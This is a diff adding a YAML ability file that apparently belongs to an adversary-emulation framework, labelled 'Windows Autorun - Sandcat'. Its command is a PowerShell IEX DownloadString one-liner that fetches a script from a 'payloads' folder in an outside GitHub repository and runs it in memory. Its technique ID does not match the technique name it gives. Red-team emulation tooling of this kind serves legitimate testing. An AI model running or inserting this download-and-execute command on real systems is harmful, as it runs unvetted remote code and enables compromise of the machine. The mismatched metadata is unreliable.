@@ -1,0 +1,11 @@
+- description: Windows Autorun - Sandcat
+  id: d9bc3cad-632e-4155-b14c-57b1afec87cb
+  name: Windows Autorun - Sandcat
+  platforms:
+    windows:
+      psh:
+        command: IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/bryanmacainag/artofwar/master/payloads/sjkhdxoi.ps1")
+  tactic: execution
+  technique:
+    attack_id: T1090
+    name: PowerShell
